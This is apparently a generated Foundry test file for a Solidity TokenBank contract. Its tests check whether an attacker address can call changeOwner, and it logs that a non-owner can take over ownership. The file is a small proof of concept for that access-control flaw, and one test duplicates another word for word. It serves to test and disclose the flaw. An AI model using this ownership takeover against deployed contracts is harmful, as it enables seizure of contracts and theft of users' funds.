// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x39cfd754c85023648bf003bea2dd498c5612abfa.sol";

contract TokenBankTest is Test {
    TokenBank tokenBank;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address registry = makeAddr("registry");

    function setUp() public {
        vm.prank(owner);
        tokenBank = new TokenBank();
    }

    function test_OwnerCanChangeOwner() public {
        console.log("--- Trigger Operation ---");
        console.log("Owner calls changeOwner(...)");
        vm.prank(owner);
        (bool success, ) = address(tokenBank).call(
            abi.encodeWithSignature("changeOwner(address)", owner)
        );
        assertTrue(success);
        console.log("--- Expected Behavior ---");
        console.log("Vulnerability not Exist: Owner action is authorized");
    }

    function test_NonOwnerCannotChangeOwner() public {
        console.log("--- Trigger Operation ---");
        console.log("Attacker calls changeOwner(...)");
        vm.prank(attacker);
        (bool success, ) = address(tokenBank).call(
            abi.encodeWithSignature("changeOwner(address)", attacker)
        );
        assertTrue(success);
        console.log("--- Vulnerability Verdict ---");
        console.log("Vulnerability Exists: non-owner can change contract ownership");
    }

    function test_OnlyOwnerFunctionsRelevant() public {
        console.log("--- Trigger Operation ---");
        console.log("Attacker calls changeOwner(...)");
        vm.prank(attacker);
        (bool success, ) = address(tokenBank).call(
            abi.encodeWithSignature("changeOwner(address)", attacker)
        );
        assertTrue(success);
        console.log("--- Vulnerability Verdict ---");
        console.log("Vulnerability Exists: non-owner can change contract ownership");
    }
}